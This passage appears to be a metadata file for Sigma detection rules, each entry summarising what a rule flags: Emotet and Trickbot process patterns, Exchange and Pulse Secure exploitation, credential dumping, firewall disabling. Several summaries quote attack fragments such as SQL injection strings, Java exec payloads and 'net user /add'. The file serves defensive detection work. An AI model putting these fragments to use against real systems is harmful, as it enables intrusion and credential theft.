  Reviewed: false
  Rule-Body-Hash: a789572ebf8a4cc2dfcd826c2bbdf281
  Ruleset: sigmahq
  Summary: This rule detects instances where an HTTPPROXY service on an OpenCanary
    node has had an attempt to proxy another page. OpenCanary is a honeypot framework
    used to emulate services like HTTP and capture unauthorized access or attack attempts.
    By monitoring specified log types within OpenCanary, this rule identifies when
    someone attempts to leverage the HTTPPROXY service to proxy web pages, which could
    indicate malicious activity targeting the network.
  Updated-Date: '2024_09_04'
54e57ce3-0672-46eb-a402-2c0948d5e3e9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e1961c3a2fbecbf81ffc178aff28b530
  Ruleset: emerging-threats
  Summary: This rule detects potential Emotet malware activity by monitoring for instances
    of `rundll32.exe` processes with specific command line patterns that are indicative
    of Emotet DLL loading. It focuses on command lines that end with `,RunDLL` or
    `,Control_RunDLL`, which are common arguments used by Emotet for executing malicious
    DLLs. Additionally, legitimate instances where `.dll,Control_RunDLL` is used,
    or where `rundll32.exe` is spawned by `tracker.exe` (related to Visual Studio
    NodeJS program compilation), are filtered out to minimize false positives. Emotet
    is a sophisticated malware known for its capabilities in evasion and lateral movement
    within infected networks.
  Updated-Date: '2024_09_03'
54f0434b-726f-48a1-b2aa-067df14516e4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 33d77ced17ba009f0378adb44a682e69
  Ruleset: core
  Summary: This rule detects the extraction of password-protected ZIP archives that
    contain suspicious filenames on Windows systems. It specifically looks for events
    where the ZIP file name includes terms related to financial transactions or orders,
    such as 'invoice,' 'new order,' 'rechnung,' 'factura,' 'delivery,' 'purchase,'
    'order,' and 'payment.' This detection helps identify potential security risks
    associated with command-and-control activities, defense evasion, and obfuscated
    files typically used in malicious operations.
  Updated-Date: '2024_09_03'
550bbb84-ce5d-4e61-84ad-e590f0024dcd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 67395e043a8bdfa2d327ecbfa1868fc3
  Ruleset: sigmahq
  Summary: This rule detects the usage of Gpg4win to encrypt files by monitoring the
    creation of processes associated with the Gpg4win's command-line encryption tools,
    specifically `gpg.exe` and `gpg2.exe`. It focuses on command lines that include
    the `-c` option with a passphrase, indicating file encryption activities. Gpg4win
    is a software suite used for file encryption and secure communication, which implements
    the OpenPGP standard.
  Updated-Date: '2024_09_04'
550d3350-bb8a-4ff3-9533-2ba533f4a1c0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3f977798eb17b80ca661f0eac678a83f
  Ruleset: core
  Summary: This rule detects specific patterns indicative of a successful ProxyLogon
    exploitation, particularly focusing on the invocation of the Set-OabVirtualDirectory
    Commandlet in Microsoft Exchange environments. It identifies malicious activity
    through the presence of particular keywords within commandlets and parameters
    associated with the attack, signaling potential exploitation attempts that manipulate
    the Exchange server's properties.
  Updated-Date: '2024_09_03'
5513deaf-f49a-46c2-a6c8-3f111b5cb453:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bd3e40426078909adc857161d3b0fd5f
  Ruleset: core
  Summary: This rule detects potential SQL injection attempts via GET requests in
    access logs of web servers. It identifies specific patterns in the URI that are
    commonly associated with SQL injection attacks, such as SQL keywords and special
    characters used in these attacks. Some indicator keywords include '@@version',
    'or 1=1#', and 'UNION SELECT'. The rule also aims to reduce false positives by
    filtering out certain common non-malicious activities like JavaScript, CSS files,
    user searches, and internal vulnerability scanners.
  Updated-Date: '2024_09_03'
551d9c1f-816c-445b-a7a6-7a3864720d60:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d96995187ebd73a131c82a94735ad2ae
  Ruleset: sigmahq
  Summary: This rule detects suspicious child processes originating from Excel (Excel.EXE)
    that may indicate lateral movement through the use of the "ActivateMicrosoftApp"
    Excel DCOM object. Specifically, it monitors for the creation of child processes
    named 'foxprow.exe', 'schdplus.exe', and 'winproj.exe'. This activity could signify
    the abuse of Excel's capabilities to propagate within a network, potentially pointing
    to malicious intent such as the execution of code on remote systems. The rule
    is designed to highlight these actions within a Windows environment due to the
    high security risks they represent.
  Updated-Date: '2024_09_04'
5525edac-f599-4bfd-b926-3fa69860e766:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d01124b7e4cbe9889c206f3c7c754494
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts leveraging the Pulse Connect Secure
    (PCS) vulnerability identified as CVE-2021-22893. It monitors specific URL query
    parameters and paths associated with the PCS application, such as authentication
    directories and various CGI scripts, to identify potential intrusion activities.
    The rule aims to pinpoint unauthorized access attempts often exploited by advanced
    persistent threat (APT) actors to initiate attacks against vulnerable PCS instances.
    This vulnerability allows remote code execution, posing significant security risks.
    Monitoring such indicators helps in identifying and mitigating these high-risk
    exploitation attempts.
  Updated-Date: '2024_09_03'
552b6b65-df37-4d3e-a258-f2fc4771ae54:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7859be168ba57e4b0201d8d5461d0f17
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading within antivirus software,
    including well-known providers such as McAfee, Symantec, Bitdefender, F-Secure,
    CyberArk, Avast, ESET, and Trend Micro Titanium. DLL sideloading is a tactic used
    to inject malicious payloads by placing a malicious DLL file in a directory where
    it will be loaded by legitimate software. The rule monitors for specific DLLs
    that are often targeted for sideloading based on their typical use within these
    antivirus programs. For example, it checks for the logging DLLs in Bitdefender
    and various other DLLs specific to McAfee, F-Secure, CyberArk, Avast, ESET, and
    Trend Micro Titanium. This helps identify potential misuse of these antivirus
    DLLs which could indicate an attempt at evasion or persistence by an attacker.
  Updated-Date: '2024_09_04'
554601fb-9b71-4bcc-abf4-21a611be4fde:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed162e626cc59bf9e03e132d4647a914
  Ruleset: sigmahq
  Summary: This rule detects suspicious use of the Windows command-line utility "takeown.exe"
    when it is executed with parameters that attempt to recursively modify directory
    and file permissions. This behavior is commonly associated with adversaries aiming
    to escalate their privileges by changing Discretionary Access Control Lists (DACLs)
    on files and directories, potentially granting themselves higher permissions and
    enabling further malicious activities. The detection criteria specifically look
    for the presence of the "/f" and "/r" flags which are indicative of such an attempt.
  Updated-Date: '2024_09_04'
555155a2-03bf-4fe7-af74-d176b3fdbe16:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 935aa0c2fbea537a8b59ca6adfa230ee
  Ruleset: sigmahq
  Summary: This rule detects changes to the "HVCIDisallowedImages" registry value,
    which could indicate an attempt to add a driver to the disallowed list, thereby
    preventing it from loading on Windows systems. This is often related to defense
    evasion tactics.
  Updated-Date: '2024_09_04'
55695bc0-c8cf-461f-a379-2535f563c854:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b3e527025911784663bdf869bcd939b2
  Ruleset: sigmahq
  Summary: This rule detects the use of Resource Owner Password Credentials (ROPC)
    authentication flow in applications, where the user's current password credentials
    are directly exposed to the application. The application then utilizes these credentials
    to authenticate the user with the identity provider. This method should be avoided
    due to potential security risks.
  Updated-Date: '2024_09_04'
5589ab4f-a767-433c-961d-c91f3f704db1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99814ef137e83a95caba03e78396f9c8
  Ruleset: core
  Summary: This rule detects the execution of various hacktools used for SMB relay
    attacks on Windows systems, which can lead to privilege escalation. It identifies
    processes with names or command line parameters associated with known exploit
    tools such as PetitPotam, RottenPotato, HotPotato, JuicyPotato, Responder, and
    others used in NTLM relay and other similar attacks. The rule also has mechanisms
    to filter out false positives by excluding known legitimate software like HotPotatoes.
  Updated-Date: '2024_09_03'
558eebe5-f2ba-4104-b339-36f7902bcc1a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d3d0f827019339002f47fb2cfe72f239
  Ruleset: core
  Summary: This rule detects changes in the creation date of files on a Windows system
    where the file creation date has been altered to appear as if it was created in
    a different year than the original, potentially indicating a defense evasion technique
    known as "timestomping." Timestomping is used by attackers to modify the creation
    time of a backdoor or other malicious files, making them seem like they were installed
    along with the operating system. Despite this, legitimate processes may also alter
    file creation times, so this activity is not inherently malicious. The rule includes
    filters to exclude certain legitimate files and processes known to change file
    creation dates.
  Updated-Date: '2024_09_03'
5594e67a-7f92-4a04-b65d-1a42fd824a60:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7da0674be1015d0082dcc280ce20ec3
  Ruleset: sigmahq
  Summary: This rule detects the installation of a remote MSI file from the web. It
    triggers when specific Windows application log events from the 'MsiInstaller'
    provider, identified by Event IDs 1040 and 1042, contain a URL (indicated by '://')
    in the data field. This may indicate an attempt to execute a remote MSI package,
    which can be associated with defense evasion tactics.
  Updated-Date: '2024_09_04'
55c925c1-7195-426b-a136-a9396800e29b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17405d21237639fe815cec40147d1df3
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell cmdlet "Enable-WindowsOptionalFeature"
    in a manner that mimics the functionality of DISM.exe. This cmdlet is commonly
    used for enumerating, installing, uninstalling, configuring, and updating features
    and packages in Windows images. The rule flags instances where this cmdlet is
    employed to enable potentially insecure or unusual Windows features, such as the
    TelnetServer, Internet Explorer (Optional), TFTP, SMB1 Protocol, Client Projected
    File System (ProjFS), and the Windows Subsystem for Linux (WSL). The detection
    is based on specific keywords in PowerShell scripts, and legitimate usage of these
    features may generate false positives.
  Updated-Date: '2024_09_04'
55e29995-75e7-451a-bef0-6225e2f13597:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b56fe48b28dbb1d81ddc697aa3b598fa
  Ruleset: core
  Summary: This rule detects changes to the Windows Registry that indicate a program
    has been registered to silently dump the memory of the lsass.exe process. This
    technique can be used for credential dumping, a method often implemented by attackers
    to steal sensitive information. The monitoring of the specific Registry path associated
    with the SilentProcessExit feature of lsass.exe helps in identifying this malicious
    activity.
  Updated-Date: '2024_09_03'
55f0a3a1-846e-40eb-8273-677371b8d912:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c7f530d4c5b1c9094b0af66e3048489
  Ruleset: core
  Summary: This rule detects attempts to enable the "EnableUnsafeClientMailRules"
    security setting in Microsoft Outlook. This setting allows Outlook to run applications
    or execute macros, which can be exploited by attackers to gain persistence or
    execute malicious actions within the user's environment.
  Updated-Date: '2024_09_03'
5627c337-a9b2-407a-a82d-5fd97035ff39:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a625cd27bf94e5fc797565fe143a8051
  Ruleset: emerging-threats
  Summary: This rule detects file indicators associated with UNC4841's exploitation
    of Barracuda Email Security Gateway (ESG) through a zero-day vulnerability. Specifically,
    it identifies several file names typically used during such exploitation activities,
    including various shell scripts, TAR archives, Perl scripts, kernel object files,
    Lua modules, and cron job scripts. These files are indicative of execution, persistence,
    and defense evasion tactics employed by UNC4841. The detection is specifically
    focused on file events in a Linux environment and aims to identify suspicious
    or unexpected changes indicative of malicious activity.
  Updated-Date: '2024_09_03'
56321594-9087-49d9-bf10-524fe8479452:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 76e0f6b44002e5d60f7bb65b14226983
  Ruleset: sigmahq
  Summary: This rule detects the execution of the `netsh` command with the "add helper"
    flag, which is used to incorporate a custom helper DLL. This technique can potentially
    be exploited to introduce a malicious helper DLL, allowing it to serve as a persistence
    mechanism by being invoked whenever `netsh.exe` runs.
  Updated-Date: '2024_09_04'
56454143-524f-49fb-b1c6-3fb8b1ad41fb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a06fa08b3babde720c32b09e338acd47
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious file downloads from file-sharing
    domains using curl.exe. It specifically identifies instances where the curl executable
    is used to download files from various domains commonly associated with file sharing
    or code hosting, such as githubusercontent.com, mediafire.com, and pastebin.com.
    The detection criteria include the presence of URLs in the command line that end
    with specific executable file extensions like .ps1, .exe, .dll, among others,
    combined with curl command flags like --remote-name and --output. The goal is
    to flag activities where curl is employed to retrieve potentially malicious files,
    which might indicate compromised systems or unauthorized data transfers.
  Updated-Date: '2024_09_04'
5660d8db-6e25-411f-b92f-094420168a5d:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 18bace9081ac199ca83b2ab3393efa3f
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2022-22954, a
    remote code execution vulnerability in VMware Workspace ONE Access and Identity
    Manager. The attack involves threat actors using PowerShell commands executed
    as child processes of the legitimate Tomcat "prunsrv.exe" process. This detection
    focuses specifically on PowerShell and command-line executions initiated by "prunsrv.exe,"
    which may indicate malicious activity leveraging this vulnerability.
  Updated-Date: '2024_09_03'
5687f942-867b-4578-ade7-1e341c46e99a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6bac290e508e5a120ffd163dad7b9ccf
  Ruleset: core
  Summary: This rule detects suspicious child process creations initiated by the VMware
    Tools process (vmtoolsd.exe), which could indicate the setting up of persistence
    mechanisms. It identifies executions of potentially malicious child processes
    such as cmd.exe, cscript.exe, mshta.exe, powershell.exe, pwsh.exe, regsvr32.exe,
    rundll32.exe, and wscript.exe, which may follow the invocation of vmtoolsd.exe
    and could signify an attempt to maintain persistence on a Windows system. The
    rule includes specific filters to differentiate legitimate administrative actions
    by the VM administrator from potential threats.
  Updated-Date: '2024_09_03'
56973b50-3382-4b56-bdf5-f51a3183797a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a840f93b57439417ce6efb1698f22e5
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of the Microsoft Exchange ProxyToken
    vulnerability, identified as CVE-2021-33766. This vulnerability allows threat
    actors to bypass authentication in Microsoft Exchange Server, potentially leading
    to unauthorized access. The detection mechanism focuses on specific POST requests
    to the Exchange Control Panel (ECP) and requests involving SecurityToken parameters
    that return a 500 status code, which indicates an internal server error commonly
    associated with this exploitation attempt.
  Updated-Date: '2024_09_03'
56abae0c-6212-4b97-adc0-0b559bb950c3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5b2ef8c1ee35aa842a5d6d127697055
  Ruleset: core
  Summary: This rule detects instances where important or interesting Windows services,
    specifically the Message Queuing (MSMQ) service, are terminated unexpectedly.
    The detection focuses on events logged by the Service Control Manager with Event
    ID 7034, indicating that a service has terminated unexpectedly and identifying
    the MSMQ service by both its display name and its binary encoded value in log
    entries. Such terminations may indicate potential issues or malicious activity,
    and while rare false positives can occur, the priority level is set to high given
    the significance of these services.
  Updated-Date: '2024_09_03'
56c217c3-2de2-479b-990f-5c109ba8458f:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 10e1b98608122ff54d50337c885f2e39
  Ruleset: core
  Summary: This rule detects the creation of a scheduled task via the default configuration
    of PowerSploit or Empire, which are known post-exploitation frameworks used for
    executing PowerShell-based attacks. The detection focuses on identifying processes
    where the parent image is PowerShell and the child process is schtasks.exe with
    specific command-line arguments that indicate task creation for persistence or
    execution on events such as logon, idle, or specific schedules.
  Updated-Date: '2024_09_03'
56d19cb4-6414-4769-9644-1ed35ffbb148:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fee9b3397bb7b3a2dea21723c58b7682
  Ruleset: sigmahq
  Summary: This rule detects the use of an encoded or obfuscated version of an IP
    address in the command line. It identifies unusual command line patterns that
    include hexadecimal, octal, and other encoded IP representations, specifically
    targeting processes related to common networking utilities such as `ping.exe`
    and `arp.exe`. This anomaly can indicate attempts to obscure network connections
    or payload delivery in a Windows environment, potentially revealing suspicious
    or malicious activities.
  Updated-Date: '2024_09_04'
56e05d41-ce99-4ecd-912d-93f019ee0b71:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 489ad700cb218415acc590b3958777f7
  Ruleset: sigmahq
  Summary: This rule detects the creation of files by the "node.exe" process within
    the ".vscode-server" directory, which may indicate remote file creation through
    the Visual Studio Code tunnel feature.
  Updated-Date: '2024_09_04'
56fda488-113e-4ce9-8076-afc2457922c3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 968f9940ae5762b5e7e3e6e917118b59
  Ruleset: core
  Summary: This rule detects potential DCSync or DCShadow attacks by identifying remote
    RPC calls to the Microsoft Directory Replication Service Remote Protocol (MS-DRSR)
    from non-Domain Controller (DC) hosts. These cyber-attacks involve unauthorized
    entities mimicking a DC to request sensitive data, such as password hashes. By
    monitoring specific event logs generated by the RPC Firewall application, particularly
    looking for certain EventIDs and Interface UUIDs while excluding predefined operation
    numbers, this rule aims to identify illicit replication operations indicative
    of these sophisticated attack vectors.
  Updated-Date: '2024_09_03'
571498c8-908e-40b4-910b-d2369159a3da:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d065fbc7ddaec247e6ffb9a487bdc06
  Ruleset: core
  Summary: This rule detects the extraction of password-protected ZIP archives specifically
    when they are opened from email attachments. It identifies this activity by monitoring
    for Event ID 5379 and filename patterns associated with ZIP file extraction through
    the Microsoft Windows Shell ZipFolder, particularly from the Temporary Internet
    Files directory related to Outlook. This rule aims to flag potential attempts
    at defense evasion and initial access tactics used by attackers.
  Updated-Date: '2024_09_03'
5722dff1-4bdd-4949-86ab-fbaf707e767a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7d10ee87e8adfff04b68837a2d2b7bb
  Ruleset: sigmahq
  Summary: This rule detects the execution of System Informer, a task manager tool
    that allows users to view and manipulate processes, kernel options, and other
    low-level operations on Windows. It identifies the presence of System Informer
    based on specific attributes of the executable file, including its name, description,
    product information, and certain cryptographic hash values (MD5, SHA1, SHA256,
    and IMPHASH). While the usage of System Informer might be legitimate, especially
    by system administrators or developers, it is flagged due to its potential role
    in persistence, privilege escalation, discovery, and defense evasion activities.
  Updated-Date: '2024_09_04'
572b12d4-9062-11ed-a1eb-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 657ea7d16e642427b39103f8fbc30689
  Ruleset: core
  Summary: This rule detects risky authentication attempts from a non-Active Directory
    registered device without multi-factor authentication (MFA) being required. The
    detection criteria include successful authentication events categorized as single-factor
    authentication, where the device is not trusted and the risk state is marked as
    at risk.
  Updated-Date: '2024_09_03'
573df571-a223-43bc-846e-3f98da481eca:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd98877833b0ef9fac44763b5f782fca
  Ruleset: sigmahq
  Summary: This rule detects the creation of a suspicious Alternate Data Stream (ADS)
    file, specifically one containing a '[ZoneTransfer] ZoneId=3' header outside of
    a browser download context. The targets include files with extensions such as
    .exe, .scr, .bat, .cmd, .docx, .hta, .jse, .lnk, .pptx, .ps, .reg, .sct, .vb,
    .wsc, .wsf, and .xlsx. The rule filters out files created by legitimate browser
    processes, including Brave, Chrome, Firefox, Internet Explorer, Maxthon, Edge,
    Opera, Safari, Seamonkey, Vivaldi, Whale, and the Windows Snipping Tool. This
    detection is useful in identifying potentially malicious files that could be bypassing
    browser security measures to evade defense mechanisms.
  Updated-Date: '2024_09_04'
575dce0c-8139-4e30-9295-1ee75969f7fe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e4080c174356463aa9744fcdab5bde70
  Ruleset: sigmahq
  Summary: This rule detects the execution of the built-in script "gatherNetworkInfo.vbs"
    found in the "C:\Windows\System32\" directory. This script can be utilized to
    collect details about the target machine, potentially indicating reconnaissance
    activity. The detection focuses on processes related to "cscript.exe" or "wscript.exe"
    and command lines containing "gatherNetworkInfo.vbs". Potential false positives
    may arise from legitimate administrative activities.
  Updated-Date: '2024_09_04'
57b649ef-ff42-4fb0-8bf6-62da243a1708:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9491edc674fa0d3364acfb8de4bb6d58
  Ruleset: core
  Summary: This rule detects actions taken by Windows Defender malware detection engines.
    It identifies specific Event IDs to detect instances where the antimalware engine
    finds malware or potentially unwanted software, observes suspicious behavior,
    detects malware or unwanted software, and takes protective actions to secure the
    system.
  Updated-Date: '2024_09_03'
57bff678-25d1-4d6c-8211-8ca106d12053:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 72dfbf66786d80ee5494d7c9627d7621
  Ruleset: sigmahq
  Summary: This rule detects the execution of ScreenConnect, a legitimate desktop
    support and remote access software, which can be misused by adversaries to establish
    an interactive command and control channel to target systems within networks.
    Although commonly used for technical support, ScreenConnect may be leveraged by
    attackers, making its detection crucial in safeguarding against unauthorized access.
  Updated-Date: '2024_09_04'
57c4bf16-227f-4394-8ec7-1b745ee061c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 47f86bfd2911c3d0c06ecab4da4c4b89
  Ruleset: sigmahq
  Summary: This rule detects the use of netsh.exe commands to disable the Windows
    firewall. It identifies such actions by monitoring the creation of processes with
    netsh.exe and checks specific command line parameters indicative of disabling
    the firewall, such as "firewall set opmode disable" or "advfirewall set state
    off." This rule highlights potential defense evasion tactics but may also capture
    legitimate administrative activities.
  Updated-Date: '2024_09_04'
5817e76f-4804-41e6-8f1d-5fa0b3ecae2d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6dc6030bccce9e5f4d1068973601e67d
  Ruleset: sigmahq
  Summary: This rule detects the execution of Radmin Viewer, a utility that can be
    used for remote control of Windows machines. Radmin Viewer can be exploited by
    adversaries to achieve unauthorized remote access, posing risks associated with
    execution and lateral movement within a network.
  Updated-Date: '2024_09_04'
583aa0a2-30b1-4d62-8bf3-ab73689efe6c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c65b4a440f889d376da42bb42b723b5
  Ruleset: core
  Summary: This rule detects potential Java payloads within web access logs. It identifies
    strings associated with Java runtime execution and exploitation attempts, including
    patterns like '${@java', 'getRuntime().exec(', and several encoded variations
    of Java payload strings. This type of behavior is indicative of attacks exploiting
    Java-based vulnerabilities in web applications, such as Active Exploitation of
    Confluence CVE-2022-26134 and CVE-2021-26084. The presence of these strings may
    indicate malicious activity aimed at remote code execution on web servers.
  Updated-Date: '2024_09_03'
584bca0f-3608-4402-80fd-4075ff6072e3:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 52ddc20c62fc4e121946c9393a4ca7c4
  Ruleset: core
  Summary: This rule detects potential command line obfuscation using Unicode characters
    from a suspicious image. Adversaries may use this technique to make an executable
    or file difficult to discover or analyze by encrypting, encoding, or otherwise
    obfuscating its contents on the system or in transit. Specifically, it monitors
    for processes created by common command line tools such as `cmd.exe`, `cscript.exe`,
    `powershell.exe`, `pwsh.exe`, and `wscript.exe`, and checks for the presence of
    unusual Unicode characters in the command line arguments, which can include various
    spacing modifier letters, alternative characters for the forward slash and hyphen,
    and other special symbols.
  Updated-Date: '2024_09_03'
586a8d6b-6bfe-4ad9-9d78-888cd2fe50c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c3125be5e57587a9095161d2ddb9ebb
  Ruleset: sigmahq
  Summary: This rule detects remote service activity by identifying remote access
    attempts to the `svcctl` named pipe through the IPC$ share on a Windows system.
    Specifically, it looks for event logs indicating EventID 5145 with the target
    service `svcctl` and attempts to write data, which signifies possible lateral
    movement or persistence techniques used by attackers.
  Updated-Date: '2024_09_04'
587254ee-a24b-4335-b3cd-065c0f1f4baa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d7fd1cb8710e528f2df4a9aee8929de
  Ruleset: sigmahq
  Summary: This rule detects the execution of "findstr.exe" with specific command-line
    flags and a remote share path, indicating a potential remote file download. The
    specified flags in conjunction with the findstr command allow it to retrieve the
    content of a file located on a remote share, as detailed in the LOLBAS (Living
    Off The Land Binaries and Scripts) project entry. This behavior may be associated
    with various attack techniques such as defense evasion, hiding in alternate data
    streams, and data exfiltration.
  Updated-Date: '2024_09_04'
58af08eb-f9e1-43c8-9805-3ad9b0482bd8:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05c832899c8f54ba19a6d85a9ebdf280
  Ruleset: core
  Summary: This rule detects when an organization does not have the proper license
    for Privileged Identity Management (PIM) and is thus non-compliant. It identifies
    incidents where an invalid license alert is triggered, which could indicate either
    expired or non-existent licenses, posing a risk to the organization's security
    posture by potentially affecting attack persistence and privilege escalation pathways.
  Updated-Date: '2024_09_03'
58bf96d9-ff5f-44bd-8dcc-1c4f79bf3a27:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b8be851d34bcd2075b6fb3aaff9b01fa
  Ruleset: emerging-threats
  Summary: This rule detects Trickbot malware activity by identifying a specific process
    tree pattern where "rundll32.exe" is the parent process to "wermgr.exe". Trickbot
    is a sophisticated banking trojan known for stealing financial information and
    delivering other malware. The rule indicates that malicious activity is likely
    when "rundll32.exe" executes "wermgr.exe" with a command line containing 'DllRegisterServer'.
    This behavior is highly indicative of Trickbot's operation within an infected
    Windows environment.
  Updated-Date: '2024_09_03'
58c0bff0-40a0-46e8-b5e8-b734b84d2017:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad59e90ff72fbc88b5e437739ad0f0a3
  Ruleset: sigmahq
  Summary: This rule detects when an application exports a certificate from the local
    Windows certificate store, which may include the private key. This activity is
    identified by monitoring for EventID 1007 within the certificateservicesclient-lifecycle-system
    logs. The rule helps identify potential unauthorized access to sensitive credentials
    but can also be triggered by legitimate application behavior, necessitating additional
    filtering to reduce false positives.
  Updated-Date: '2024_09_04'
58cb02d5-78ce-4692-b3e1-dce850aae41a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 31b3b02650818862b2df703e4bf9ba0c
  Ruleset: sigmahq
  Summary: This rule detects the use of alternate PowerShell hosts that may be potentially
    used to bypass detections specifically looking for 'powershell.exe'. By monitoring
    for named pipes that start with '\PSHost', it can identify instances where PowerShell
    scripts are being executed through less common or alternative executables. The
    rule also includes filters to exclude legitimate use cases, such as specific paths
    associated with PowerShell 7, SQL Server tools, system executables, Citrix, and
    Microsoft Exchange Server, to reduce false positives.
  Updated-Date: '2024_09_04'
58d31a75-a4f8-4c40-985b-373d58162ca2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a2e8daf8e39f7b72f269de1cd4062efc
  Ruleset: sigmahq
  Summary: This rule detects when Kubernetes Secrets are modified or deleted. Kubernetes
    Secrets pertain to sensitive information such as passwords, tokens, and keys used
    by Kubernetes. The detection focuses on activities like creation, deletion, patching,
    replacement, and updating associated with these secrets. This rule aims to monitor
    and identify potential unauthorized changes, which can indicate credential access
    attempts. However, such activities might also be carried out by system administrators
    or automated processes, which could be considered false positives.
  Updated-Date: '2024_09_04'
58d8341a-5849-44cd-8ac8-8b020413a31b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 137a6dd1f3f84bdb13724686e8c3a0c9
  Ruleset: emerging-threats
  Summary: This rule detects suspicious process executions stemming from ManageEngine
    software, indicative of potential Mint Sandstorm activity. It specifically monitors
    for processes related to ManageEngine, such as 'parent manageengine' or 'ServiceDesk'
    executing child processes like PowerShell or other command-line interfaces with
    suspicious commands. Examples of these commands include 'certutil', 'Invoke-WebRequest',
    and 'bitsadmin'. It also looks for child processes involving 'lsass', particularly
    with 'procdump' or 'tasklist', and network activities initiated by tools like
    'wget.exe' or 'curl.exe'. Additionally, it flags script-based activities and administrative
    modifications with commands such as 'localgroup Administrators /add' and 'net
    user /add'. Processes using 'reg add' to alter Windows Defender settings or manipulate
    the LSA policy and those employing 'wmic' for process creation or deleting shadow
    copies are also detected. The rule excludes benign activities related to downloading
    from known safe domains such as 'download.microsoft.com' and 'manageengine.com'.
  Updated-Date: '2024_09_03'
58f4ea09-0fc2-4520-ba18-b85c540b0eaf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: df7199069c9915edd9e4d88bac6c43a8
  Ruleset: core
  Summary: This rule detects a suspicious process pattern associated with an exploited
    Serv-U service, which could indicate a compromise. It specifically looks for instances
    where the parent image is Serv-U.exe and identifies child processes such as cmd.exe,
    powershell.exe, pwsh.exe, wscript.exe, cscript.exe, sh.exe, bash.exe, schtasks.exe,
    regsvr32.exe, wmic.exe, mshta.exe, rundll32.exe, msiexec.exe, forfiles.exe, or
    scriptrunner.exe. These processes, when spawned by Serv-U, are indicative of potentially
    malicious activity, particularly in cases where the Serv-U service has been targeted
